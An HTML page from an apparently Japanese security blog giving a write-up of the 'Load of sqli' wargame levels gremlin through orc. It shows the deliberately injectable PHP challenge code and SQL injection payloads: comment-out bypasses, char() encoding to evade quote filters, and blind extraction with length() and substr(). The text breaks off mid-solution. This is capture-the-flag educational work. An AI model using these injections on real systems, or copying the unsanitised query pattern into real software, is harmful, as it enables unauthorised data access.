<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>load of sqli | wt-l00 memo</title>
    <meta name="generator" content="VuePress 1.4.1">
    <meta name="description" content="wt-l00 blog">
    <link rel="preload" href="/blog/assets/css/0.styles.e1559409.css" as="style"><link rel="preload" href="/blog/assets/js/app.61f8cf39.js" as="script"><link rel="preload" href="/blog/assets/js/7.cad17870.js" as="script"><link rel="preload" href="/blog/assets/js/17.fe1b2920.js" as="script"><link rel="prefetch" href="/blog/assets/js/1.94378849.js"><link rel="prefetch" href="/blog/assets/js/10.7b2f45de.js"><link rel="prefetch" href="/blog/assets/js/11.6b6ab1c8.js"><link rel="prefetch" href="/blog/assets/js/12.5f335b79.js"><link rel="prefetch" href="/blog/assets/js/13.61e12d61.js"><link rel="prefetch" href="/blog/assets/js/14.c858b097.js"><link rel="prefetch" href="/blog/assets/js/15.6b735ad6.js"><link rel="prefetch" href="/blog/assets/js/16.f7ceb661.js"><link rel="prefetch" href="/blog/assets/js/18.9393ea26.js"><link rel="prefetch" href="/blog/assets/js/19.d1096e60.js"><link rel="prefetch" href="/blog/assets/js/3.bd31272e.js"><link rel="prefetch" href="/blog/assets/js/4.4260b830.js"><link rel="prefetch" href="/blog/assets/js/5.84a72133.js"><link rel="prefetch" href="/blog/assets/js/6.e561dd60.js"><link rel="prefetch" href="/blog/assets/js/8.0d06a535.js"><link rel="prefetch" href="/blog/assets/js/9.1fcdb666.js">
    <link rel="stylesheet" href="/blog/assets/css/0.styles.e1559409.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div id="vuepress-theme-meteorlxy"><header class="header" style="background-size:cover;background-repeat:no-repeat;background-position:center;background-attachment:scroll;background-image:url(/blog/img/bg.jpg);" data-v-7a046aea><div data-v-e4145d0a data-v-7a046aea><nav class="navbar" data-v-e4145d0a><div class="container" data-v-e4145d0a><a href="/blog/" class="router-link-active" data-v-e4145d0a><span class="navbar-site-name" data-v-e4145d0a>
          wt-l00 memo
        </span></a> <div class="navbar-toggler" data-v-e4145d0a><svg class="icon" style="font-size:1.2em;" data-v-e4145d0a data-v-e4145d0a><title data-v-e4145d0a data-v-e4145d0a>menu</title><use xlink:href="#icon-menu" data-v-e4145d0a data-v-e4145d0a></use></svg></div> <div class="navbar-links" data-v-e4145d0a><a href="/blog/" class="navbar-link" data-v-e4145d0a>
            Home
          </a><a href="/blog/posts/" class="navbar-link router-link-active" data-v-e4145d0a>
            Posts
          </a><a href="/blog/about/" class="navbar-link" data-v-e4145d0a>
            About
          </a></div></div></nav> <div class="navbar-holder" style="display:none;" data-v-e4145d0a></div></div> <div class="banner" data-v-98d6aa8c data-v-7a046aea data-v-7a046aea><div class="container" data-v-98d6aa8c><div class="center" data-v-98d6aa8c><h1 data-v-98d6aa8c data-v-7a046aea>
          load of sqli
        </h1></div></div></div></header> <div class="container clearfix show-aside" data-v-4dd605a1 data-v-4dd605a1><main class="main" data-v-4dd605a1><div class="post" data-v-4dd605a1 data-v-4dd605a1><section class="post-meta main-div" data-v-4e23451f><section class="post-date clearfix" data-v-4e23451f><span class="create-date" data-v-4e23451f>
      Created : 2020-05-03
    </span> <span class="update-date" data-v-4e23451f>
      Updated : 2020-05-03
    </span></section> <section class="post-links" data-v-4e23451f><a href="/blog/posts/2020/05/03/_20200503-1.html" class="post-link" data-v-4e23451f>
      Previous Post : runc build
    </a> <!----></section></section> <article class="main-div"><div class="post-content content content__default"><h1 id="load-of-sqli"><a href="#load-of-sqli" class="header-anchor">#</a> Load of sqli</h1> <p>これは，Load of sqliのwriteup兼自分のメモ</p> <h2 id="gremlin"><a href="#gremlin" class="header-anchor">#</a> gremlin</h2> <h3 id="問題"><a href="#問題" class="header-anchor">#</a> 問題</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
  <span class="token keyword">include</span> <span class="token double-quoted-string string">&quot;./config.php&quot;</span><span class="token punctuation">;</span>
  <span class="token function">login_chk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">dbconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/prob|_|\.|\(\)/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No Hack ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// do not try to attack another table, database!</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/prob|_|\.|\(\)/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No Hack ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select id from prob_gremlin where id='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">}</span></span>' and pw='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">}</span></span>'&quot;</span><span class="token punctuation">;</span>
  <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$query</span><span class="token punctuation">}</span></span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span><span class="token punctuation">;</span>
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;gremlin&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h3 id="考察"><a href="#考察" class="header-anchor">#</a> 考察</h3> <p>以下の条件式を満たせばよい．</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;gremlin&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>idもpwもわからないので，すべてのidをresultに格納することを考える．</p> <h3 id="回答"><a href="#回答" class="header-anchor">#</a> 回答</h3> <p>pw以下はコメントアウト</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> id <span class="token keyword">from</span> prob_gremlin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">''</span> <span class="token operator">or</span> <span class="token boolean">true</span> <span class="token comment">#' and pw=''</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="cobolt"><a href="#cobolt" class="header-anchor">#</a> cobolt</h2> <h3 id="問題-2"><a href="#問題-2" class="header-anchor">#</a> 問題</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
  <span class="token keyword">include</span> <span class="token double-quoted-string string">&quot;./config.php&quot;</span><span class="token punctuation">;</span> 
  <span class="token function">login_chk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">dbconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/prob|_|\.|\(\)/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No Hack ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/prob|_|\.|\(\)/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No Hack ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select id from prob_cobolt where id='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">}</span></span>' and pw=md5('<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">}</span></span>')&quot;</span><span class="token punctuation">;</span> 
  <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$query</span><span class="token punctuation">}</span></span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;cobolt&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;h2&gt;Hello <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>&lt;br&gt;You are not admin :(&lt;/h2&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h3 id="考察-2"><a href="#考察-2" class="header-anchor">#</a> 考察</h3> <p>idがadminになる条件式を作る．</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;cobolt&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="回答-2"><a href="#回答-2" class="header-anchor">#</a> 回答</h3> <p>idをadminにして後ろはコメントアウト</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> id <span class="token keyword">from</span> prob_cobolt <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'admin'</span> <span class="token comment">#' and pw=md5('')</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="goblin"><a href="#goblin" class="header-anchor">#</a> goblin</h2> <h3 id="問題-3"><a href="#問題-3" class="header-anchor">#</a> 問題</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
  <span class="token keyword">include</span> <span class="token double-quoted-string string">&quot;./config.php&quot;</span><span class="token punctuation">;</span> 
  <span class="token function">login_chk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">dbconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/prob|_|\.|\(\)/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>no<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No Hack ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\'|\&quot;|\`/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>no<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No Quotes ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select id from prob_goblin where id='guest' and no=<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>no<span class="token punctuation">]</span><span class="token punctuation">}</span></span>&quot;</span><span class="token punctuation">;</span> 
  <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$query</span><span class="token punctuation">}</span></span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;h2&gt;Hello <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$result</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">}</span></span>&lt;/h2&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;goblin&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h3 id="考察-3"><a href="#考察-3" class="header-anchor">#</a> 考察</h3> <p>idをadminにしたいところだが，</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;goblin&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>guestに固定されている．</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select id from prob_goblin where id='guest' and no=<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>no<span class="token punctuation">]</span><span class="token punctuation">}</span></span>&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>no = 1 or id = 'admin'をやろうとしたが，シングルクォートがエスケープされている．
char関数を使うとスマートかも．</p> <table><thead><tr><th>文字</th> <th>ascii</th></tr></thead> <tbody><tr><td>'a'</td> <td>97</td></tr> <tr><td>'d'</td> <td>100</td></tr> <tr><td>'m'</td> <td>109</td></tr> <tr><td>'i'</td> <td>105</td></tr> <tr><td>'n'</td> <td>110</td></tr></tbody></table> <h3 id="回答-3"><a href="#回答-3" class="header-anchor">#</a> 回答</h3> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> id <span class="token keyword">from</span> prob_goblin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'guest'</span> <span class="token operator">and</span> <span class="token keyword">no</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">or</span> id<span class="token operator">=</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="orc"><a href="#orc" class="header-anchor">#</a> orc</h2> <h3 id="問題-4"><a href="#問題-4" class="header-anchor">#</a> 問題</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
  <span class="token keyword">include</span> <span class="token double-quoted-string string">&quot;./config.php&quot;</span><span class="token punctuation">;</span> 
  <span class="token function">login_chk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">dbconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/prob|_|\.|\(\)/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No Hack ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select id from prob_orc where id='admin' and pw='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">}</span></span>'&quot;</span><span class="token punctuation">;</span> 
  <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$query</span><span class="token punctuation">}</span></span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;h2&gt;Hello admin&lt;/h2&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select pw from prob_orc where id='admin' and pw='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">}</span></span>'&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;orc&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><h3 id="考察-4"><a href="#考察-4" class="header-anchor">#</a> 考察</h3> <p><a href="https://www.php.net/manual/ja/function.addslashes.php" target="_blank" rel="noopener noreferrer">addslashes関数<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>があるので，シングルクォートを用いてもエスケープされる．</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>以下の制約もあるので，クエリにadminのpwが必要．</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;orc&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>blindsqliを使う．
試しに以下のようなクエリを投げるとHello adminと表示されるのでblindsqliが可能．</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> id <span class="token keyword">from</span> prob_orc <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'admin'</span> <span class="token operator">and</span> pw<span class="token operator">=</span><span class="token string">''</span> <span class="token operator">or</span> <span class="token boolean">true</span> <span class="token operator">&gt;</span> <span class="token number">1</span> <span class="token comment">#'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>まず，pwの長さを確認するために，length関数を使う．
以下のようにちまちま確かめると，8文字だとわかる．</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> id <span class="token keyword">from</span> prob_orc <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'admin'</span> <span class="token operator">and</span> pw<span class="token operator">=</span><span class="token string">''</span> <span class="token operator">or</span> id<span class="token operator">=</span><span class="token string">'admin'</span> <span class="token operator">and</span> length<span class="token punctuation">(</span>pw<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1</span> <span class="token comment">#'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>ここからは8文字のパスワードを実際に当てていく．そこで，<a href="https://www.php.net/manual/ja/function.substr.php" target="_blank" rel="noopener noreferrer">substr関数<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>を用いる．<br>
以下のように，substr(文字列，何文字目から，文字数)のように使う．</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> id <span class="token keyword">from</span> prob_orc <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'admin'</span> <span class="token operator">and</span> pw<span class="token operator">=</span><span class="token string">''</span> <span class="token operator">or</span> id<span class="token operator">=</span><span class="token string">'admin'</span> <span class="token operator">and</span> substr<span class="token punctuation">(</span>pw<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">2</span> <span class="token comment">#'</span>
